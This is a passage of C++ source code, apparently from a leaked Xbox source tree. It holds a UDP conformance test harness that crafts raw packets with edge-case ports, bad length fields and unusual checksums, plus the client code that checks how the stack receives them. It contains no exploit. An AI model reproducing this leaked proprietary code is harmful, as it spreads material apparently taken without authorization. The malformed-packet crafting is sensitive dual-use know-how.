	// Uninitialize the SPARTA variables for this session
	pCurrentSession->pInterfaceList ? delete pCurrentSession->pInterfaceList : 0;
	pCurrentSession->pInterface ? delete pCurrentSession->pInterface : 0;
//	pCurrentSession->pAutoArp ? delete pCurrentSession->pAutoArp : 0;

	LocalFree(pCurrentSession);

	// If anything needs to be cleaned up, it will be done here.
	return;
}


//==================================================================================
// Test functions
//==================================================================================

//==================================================================================
// SendUDPPacket
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with the specified parameters
//
// Arguments:
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//	DWORD			FromAddr		Address of user that requested the test
//	WORD			SourcePort		Value for the source port field of the datagram
//	WORD			DestPort		Value for the dest port field of the datagram
//	WORD			Length			Value for the length field of the datagram
//	BOOL			fCalcLength		Bool indicating whether to use Length or auto generate this field		
//	WORD			Checksum		Value for the checksum field of the datagram
//	BOOL			fCalcChecksum	Bool indicating whether to use Checksum or auto generate this field
//	BOOL			fChecksumFix	Bool indicating if the packet should be doctored so that the supplied checksum works
//	DWORD			PayloadSize		Total number of bytes in the IP packet payload
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL SendUDPPacket(PSESSION_INFO pSessionInfo, DWORD FromAddr, WORD SourcePort, WORD DestPort, WORD Length, BOOL fCalcLength, WORD Checksum, BOOL fCalcChecksum, BOOL fChecksumFix, DWORD PayloadSize)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], *pBuffer = NULL;
	BOOL fSuccess = TRUE, fUDPPacket = FALSE;

	// Format the client Mac address string
	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Format the client IP address string
	ClientAddr.S_un.S_addr = FromAddr;
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		if(PayloadSize >= UDPHEADER_SIZE)
		{
			fUDPPacket = TRUE;
			pIPPacket = new CUDPPacket(MediaType);
		}
		else
			pIPPacket = new CIPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pIPPacket->MacHeader.SetProtocolType(0x800);
		pIPPacket->IPHeader.SetVersion(4);
		pIPPacket->IPHeader.SetTOS(0);
		pIPPacket->IPHeader.SetID(1);
		pIPPacket->IPHeader.SetFlag(0);
		pIPPacket->IPHeader.SetFragOffset(0);
		pIPPacket->IPHeader.SetTTL(64);
		pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
		pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
		pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
				
		// If we are dealing with a packet large enough for the UDP header
		if(fUDPPacket)
		{
			CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
			
			pUDPPacket->UDPHeader.SetSrcPort(SourcePort);
			pUDPPacket->UDPHeader.SetDestPort(DestPort);

			// Set up the length fields
			if(fCalcLength)
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(ON);
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(ON);
			}
			else
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->UDPHeader.SetLength(Length);
				pUDPPacket->IPHeader.SetDatagramLength(Length + IPHEADER_SIZE);
			}
			
			// Set up the checksum field
			if(fCalcChecksum)
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(ON);
			else
			{
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(Checksum);
			}
		}
		// Otherwise, this packet is too small for the UDP header
		else
		{
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
		}

		// If we are to send data beyond the header, set up the data buffer
		if(PayloadSize > UDPHEADER_SIZE)
		{	
			// Create the buffer for the remaining packet data
			pBuffer = (CHAR *) LocalAlloc(LPTR, PayloadSize - UDPHEADER_SIZE);
			memset(pBuffer, (int) 'x', PayloadSize - UDPHEADER_SIZE);
			
			// Associate that buffer with the packet
			pIPPacket->SetUserBuffer(pBuffer, PayloadSize - UDPHEADER_SIZE, TRUE);				
		}
		else if((PayloadSize > IPHEADER_SIZE) && !fUDPPacket)
		{
			// Create the buffer for the remaining packet data
			pBuffer = (CHAR *) LocalAlloc(LPTR, PayloadSize - IPHEADER_SIZE);
			memset(pBuffer, (int) 'x', PayloadSize - IPHEADER_SIZE);
			
			// Associate that buffer with the packet
			pIPPacket->SetUserBuffer(pBuffer, PayloadSize - IPHEADER_SIZE, TRUE);				
		}
		
		pSessionInfo->pInterface->Send(pIPPacket);
	}
	catch(CSpartaException *Ex)
	{
		_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete Ex;
		fSuccess = FALSE;
	}

	// Clean up the packet
	if(pIPPacket)
	{
		if(fUDPPacket)
			delete (CUDPPacket *) pIPPacket;
		else
			delete pIPPacket;
	}

	// Release the payload buffer
	pBuffer ? LocalFree(pBuffer) : 0;

	return fSuccess;
}

//==================================================================================
// UDPSourceMaxServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet from the maximum port number
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		MAXWORD, 
		pSessionInfo->LowPort,
		0, 
		TRUE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPSourceMinServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet from the minimum port number
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		1, 
		pSessionInfo->LowPort,
		0, 
		TRUE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPSourceZeroServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet from port number zero
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceZeroServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		0, 
		pSessionInfo->LowPort,
		0, 
		TRUE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPDestMaxServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet to the maximum port number
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		MAXWORD - 1,
		0, 
		TRUE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPDestMinServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet to the minimum port number
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		1,
		0, 
		TRUE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPDestZeroServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet to port number zero
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestZeroServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		0,
		0, 
		TRUE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPLenBelowMinServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length below the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		UDPHEADER_SIZE - 1, 
		FALSE, 
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE);
}

//==================================================================================
// UDPLenAtMinServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length of exactly the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAtMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		UDPHEADER_SIZE, 
		FALSE,
		0, 
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE);
}

//==================================================================================
// UDPLenAboveMinServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length above the minimum
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAboveMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		UDPHEADER_SIZE + 1, 
		FALSE, 
		0,
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE + 1);
}

//==================================================================================
// UDPLenAboveTotalServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length above total bytes in packet
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAboveTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		UDPHEADER_SIZE + 1, 
		FALSE, 
		0,
		TRUE, 
		FALSE, 
		UDPHEADER_SIZE);
}

//==================================================================================
// UDPLenBelowTotalServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length below the total bytes in packet
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenBelowTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		UDPHEADER_SIZE + 1, 
		FALSE, 
		0x0000,
		FALSE,
		FALSE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPLenMaxServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length below the total bytes in packet
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	// TODO - for now, just do maximum ethernet size
	// TODO - need to change the UDP length to 1500 - IPHEADER_SIZE
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		1500 - IPHEADER_SIZE, 
		FALSE, 
		0,
		TRUE, 
		FALSE, 
		1500 - IPHEADER_SIZE);
}

//==================================================================================
// UDPCheckOnesServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a valid checksum of all ones
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPCheckOnesServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		0, 
		TRUE, 
		0xFFFF,
		FALSE, 
		TRUE, 
		UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPCheckZerosServ
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a checksum of all zeros (indicating not computed)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPCheckZerosServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	return SendUDPPacket(pSessionInfo,
		FromAddr,
		pSessionInfo->LowPort,
		pSessionInfo->LowPort,
		0, 
		TRUE, 
		0x0000,
		FALSE, 
		FALSE, 
		UDPHEADER_SIZE + 2);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\udp\client\udptest.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "udptest.h"

//==================================================================================
// Globals
//==================================================================================
// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( udptest )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( udptest )
    EXPORT_TABLE_ENTRY( "StartTest", UdpTestStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", UdpTestEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", UdpTestDllMain )
END_EXPORT_TABLE( udptest )

// Test specific globals
static CRITICAL_SECTION g_csSerializeAccess;
static HANDLE g_hLog = INVALID_HANDLE_VALUE;
static PUDP_TEST_FUNCTION g_TestFunctions[UDPMSG_MAXTEST] = 
{
	UDPSourceMaxTest,												// UDPMSG_SOURCEPORT_MAX
	UDPSourceMinTest,												// UDPMSG_SOURCEPORT_MIN
	UDPSourceZeroTest,												// UDPMSG_SOURCEPORT_ZERO
	UDPDestMaxTest,													// UDPMSG_DESTPORT_MAX
	UDPDestMinTest,													// UDPMSG_DESTPORT_MIN
	UDPDestZeroTest,												// UDPMSG_DESTPORT_ZERO
	UDPLenBelowMinTest,												// UDPMSG_LENGTH_BELOWMIN
	UDPLenAtMinTest,												// UDPMSG_LENGTH_ATMIN
	UDPLenAboveMinTest,												// UDPMSG_LENGTH_ABOVEMIN
	UDPLenAboveTotalTest,											// UDPMSG_LENGTH_ABOVETOTAL
	UDPLenBelowTotalTest,											// UDPMSG_LENGTH_BELOWTOTAL
	UDPLenMaxTest,													// UDPMSG_LENGTH_MAXIMUM
	UDPCheckZerosTest												// UDPMSG_CHECKSUM_ZEROSOK
};

static LPSTR g_TestNames[UDPMSG_MAXTEST] = 
{
	"Packet from maximum port",							// UDPMSG_SOURCEPORT_MAX
	"Packet from minimum port",							// UDPMSG_SOURCEPORT_MIN
	"Packet from port zero",							// UDPMSG_SOURCEPORT_ZERO
	"Packet on maximum port",							// UDPMSG_DESTPORT_MAX
	"Packet on minimum port",							// UDPMSG_DESTPORT_MIN
	"Packet on port zero",								// UDPMSG_DESTPORT_ZERO
	"Packet with length below minimum",					// UDPMSG_LENGTH_BELOWMIN
	"Packet with minimum length",						// UDPMSG_LENGTH_ATMIN
	"Packet with length above minimum",					// UDPMSG_LENGTH_ABOVEMIN
	"Packet with oversized length",						// UDPMSG_LENGTH_ABOVETOTAL
	"Packet with undersized length",					// UDPMSG_LENGTH_BELOWTOTAL
	"Packet with maximum length",						// UDPMSG_LENGTH_MAXIMUM
	"Packet with checksum of all zeros"					// UDPMSG_CHECKSUM_ZEROSOK
};


//==================================================================================
// UdpTestDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI UdpTestDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		InitializeCriticalSection(&g_csSerializeAccess);
		break;
	case DLL_PROCESS_DETACH:
		XNetRelease();
		DeleteCriticalSection(&g_csSerializeAccess);
		break;
	default:
		break;
	}

    return TRUE;
}



//==================================================================================
// UdpTestStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI UdpTestStartTest(IN HANDLE  hLog)
{
	UDP_TESTREQ TestRequest;
	INT iConn;
	HANDLE hThread;
	DWORD dwThreadId, dwTestDone;
    WSADATA WSAData;
	INT nRet = 0;
	NETSYNC_TYPE_CALLBACK CallbackSessionInfo;
	HANDLE hClientObject = NULL;
	IN_ADDR ServerAddr;
	WORD LowPort, HighPort;
	INT i;
	BYTE   MacAddr[6];
	DWORD  dwType = 0, dwSize = 0, dwErrorCode = 0;

	// Since we have to be thread safe, serialize entry for now
	EnterCriticalSection(&g_csSerializeAccess);

	g_hLog = hLog;

    // Set XLog info
	xSetOwnerAlias(g_hLog, "tristanj");
    xSetComponent(g_hLog, "Network(S)", "TCP/IP (S-n)");
	xSetFunctionName(g_hLog, "recvfrom");

    // Init winsock
    if(nRet = WSAStartup(MAKEWORD(2, 2), &WSAData))
	{
		xLog(g_hLog, XLL_FAIL, "Couldn't init winsock: %d", nRet);
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Winsock layer initialized");

	// Get the mac address
	dwErrorCode = XQueryValue(XC_FACTORY_ETHERNET_ADDR, &dwType, MacAddr, sizeof(MacAddr), &dwSize);
	if (ERROR_SUCCESS != dwErrorCode) {
		xLog(g_hLog, XLL_FAIL, "Couldn't get ethernet address: 0x%08x", dwErrorCode);
		goto Exit;
	}

	sprintf(TestRequest.MacAddr, "_%02x%02x%02x%02x%02x%02x",
		MacAddr[0], MacAddr[1], MacAddr[2], MacAddr[3], MacAddr[4], MacAddr[5]);
	xLog(g_hLog, XLL_INFO, "Local ethernet address: %s", TestRequest.MacAddr);

	// Prepare to find a server that can run the UDP tests
	CallbackSessionInfo.byMinClientCount = 0;
	CallbackSessionInfo.byMaxClientCount = 0;
	CallbackSessionInfo.nMinPortCount = 1;
	CallbackSessionInfo.lpszDllName_W = UDP_SERVER_DLL_W;
	CallbackSessionInfo.lpszMainFunction_A = UDP_SERVER_MAIN_FUNCTION_A;
	CallbackSessionInfo.lpszStartFunction_A = UDP_SERVER_START_FUNCTION_A;
	CallbackSessionInfo.lpszStopFunction_A = UDP_SERVER_STOP_FUNCTION_A;

	// Create a client to communicate with that server
	hClientObject = NetsyncCreateClient(0, NETSYNC_SESSION_CALLBACK, &CallbackSessionInfo, &ServerAddr.S_un.S_addr, NULL, &LowPort, &HighPort);
	if (hClientObject == INVALID_HANDLE_VALUE)
	{
		xLog(g_hLog, XLL_FAIL, "Couldn't create Netsync client");
		goto Exit;
	}

	DbgPrint("UDPTEST: Starting tests...\n");

	// Run the tests
	for(i = 0; i < UDPMSG_MAXTEST; i++)
	{
		DWORD dwSendResult;

		TestRequest.dwMessageId = UDPMSG_TESTREQ;
		TestRequest.TestId = (UDPMSG_TESTTYPES) i;

		xStartVariation(g_hLog, g_TestNames[i]);

		// Send the test request to the Netsync server
		dwSendResult = NetsyncSendClientMessage(hClientObject, 0, sizeof(UDP_TESTREQ), (char *) &TestRequest);
		if(dwSendResult != WAIT_OBJECT_0)
		{
			xLog(g_hLog, XLL_INFO, "Error sending message to UDP server");
			DbgPrint("UDPTEST: Error during test, aborting...\n");
			goto Exit;
		}

		// If we get here, then the Netsync server successfully acked the test.
		// Now run the client side of the test

		if(g_TestFunctions[i](LowPort, HighPort))
			xLog(g_hLog, XLL_PASS, "Test passed!");
		else
			xLog(g_hLog, XLL_FAIL, "Test failed!");

		xEndVariation(g_hLog);

		Sleep(5000);
	}

	DbgPrint("UDPTEST: Tests complete\n");

Exit:

	// Tell the netsync server we're done
	dwTestDone = UDPMSG_TESTDONE;
	NetsyncSendClientMessage(hClientObject, 0, sizeof(DWORD), (char *) &dwTestDone);

	hClientObject ? NetsyncCloseClient(hClientObject) : 0;

	// Clean up winsock
	xLog(g_hLog, XLL_INFO, "Cleaning up Winsock layer");
	WSACleanup();

	g_hLog = INVALID_HANDLE_VALUE;

	// Allow other threads to enter now
	LeaveCriticalSection(&g_csSerializeAccess);

}            

//==================================================================================
// UdpTestEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI UdpTestEndTest()
{
	// We already cleaned up everything at the end of StartTest
}

//==================================================================================
// IsSocketReady
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//	SOCKET			Socket				Socket to monitor for a given state
//	SOCKET_STATE	SocketState			State to monitor for
// Returns:
//	Returns TRUE if the activity has occured, FALSE otherwise
//==================================================================================
static BOOL IsSocketReady(SOCKET Socket, SOCKET_STATE SocketState, DWORD dwSecondsToWait)
{
	fd_set SocketCollection, *ReadCollection, *WriteCollection, *ExceptCollection;
	timeval TimeOut = {0,0}, *pTimeOut = NULL;

	// If we have a bad socket, just report FALSE
	if(Socket == INVALID_SOCKET)
		return FALSE;

	if(dwSecondsToWait != TIME_INFINITY)
	{
		TimeOut.tv_sec = dwSecondsToWait;
		pTimeOut = &TimeOut;
	}

	FD_ZERO(&SocketCollection);
	FD_SET(Socket, &SocketCollection);

	// Depending on the activity to monitor for, setup the parameters to select
	switch(SocketState)
	{
	case READABLE:
		ReadCollection = &SocketCollection;
		WriteCollection = NULL;
		ExceptCollection = NULL;
		break;
	case WRITEABLE:
		ReadCollection = NULL;
		WriteCollection = &SocketCollection;
		ExceptCollection = NULL;
		break;
	default:
		ReadCollection = NULL;
		WriteCollection = NULL;
		ExceptCollection = &SocketCollection;
		break;
	}

	if((select(1, ReadCollection, WriteCollection, ExceptCollection, pTimeOut)) != 1)
		return FALSE;
	else
		return TRUE;
}

//==================================================================================
// ReceiveUDPPacket
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with with a certain set of properties
//
// Arguments:
//	WORD			LocalPort			Port to receive the packet on
//	WORD			ExpectedRemotePort	Remote port that should be reported for packet
//	DWORD			ExpectedLength		Length that should be reported for packet
//	BOOL			fUseLength			Whether to care if the length matches or not
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL ReceiveUDPPacket(WORD LocalPort, WORD ExpectedRemotePort, DWORD ExpectedLength, BOOL fUseLength)
{
	SOCKET UDPSocket = INVALID_SOCKET;
	SOCKADDR_IN LocalAddress, RemoteAddress;
	DWORD dwBytesAvailable = 0, dwBufferSize = 0, dwBytesReceived = 0;
	BOOL fPassed = TRUE;
	CHAR *pBuffer = NULL;
	INT nRemoteAddressSize = sizeof(SOCKADDR_IN);

	// Create the socket
	UDPSocket = socket(AF_INET, SOCK_DGRAM, 0);
	if(UDPSocket == INVALID_SOCKET)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't create socket!");
		fPassed = FALSE;
		goto Exit;
	}

	// Setup the local binding info
	LocalAddress.sin_addr.s_addr = INADDR_ANY;
	LocalAddress.sin_family = AF_INET;
	LocalAddress.sin_port = htons(LocalPort);

	// Bind the socket
	if(bind(UDPSocket, (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't bind socket!");
		fPassed = FALSE;
		goto Exit;
	}

	// Wait for the socket to receive a packet (i.e. select will say it is readable)
	if(!IsSocketReady(UDPSocket, READABLE, 10))
	{
		xLog(g_hLog, XLL_INFO, "Winsock reported no data available");
		fPassed = FALSE;
		goto Exit;
	}

	// A datagram is buffered, now receive it...
	if(ioctlsocket(UDPSocket, FIONREAD, &dwBytesAvailable) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Query for number of bytes available failed");
		fPassed = FALSE;
		goto Exit;
	}

	dwBufferSize = dwBytesAvailable ? dwBytesAvailable : 1;
	pBuffer = (CHAR *) LocalAlloc(LPTR, dwBufferSize);

	// Receive the datagram
	if((dwBytesReceived = recvfrom(UDPSocket, pBuffer, dwBufferSize, 0, (struct sockaddr *) &RemoteAddress, &nRemoteAddressSize)) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_INFO, "Couldn't receive the datagram");
		fPassed = FALSE;
		goto Exit;
	}

	// Is the reported port correct?
	if(ntohs(RemoteAddress.sin_port) != ExpectedRemotePort)
	{
		xLog(g_hLog, XLL_INFO, "Reported destination port (%u) didn't match expected value (%u)", ntohs(RemoteAddress.sin_port), ExpectedRemotePort);
		fPassed = FALSE;
		goto Exit;
	}

	// Is the reported length correct?
	if(fUseLength && (dwBytesReceived != ExpectedLength))
	{
		xLog(g_hLog, XLL_INFO, "Reported length (%u) didn't match expected value (%u)", dwBytesReceived, ExpectedLength);
		fPassed = FALSE;
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Packet received successfully");

Exit:

	(UDPSocket != INVALID_SOCKET) ? closesocket(UDPSocket) : 0;
	pBuffer ? LocalFree(pBuffer) : 0;

	return fPassed;
}

//==================================================================================
// UDPSourceMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet from the maximum port number
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceMaxTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(LowPort, (WORD) 0xffff, 0, FALSE);
}

//==================================================================================
// UDPSourceMinTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet from the minimum port number
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(LowPort, 1, 0, FALSE);
}

//==================================================================================
// UDPSourceZeroTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet from port number zero
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceZeroTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(LowPort, 0, 0, FALSE);
}

//==================================================================================
// UDPDestMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet on the maximum port number
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestMaxTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket((WORD) 0xfffe, LowPort, 0, FALSE);
}

//==================================================================================
// UDPDestMinTest
//----------------------------------------------------------------------------------
//
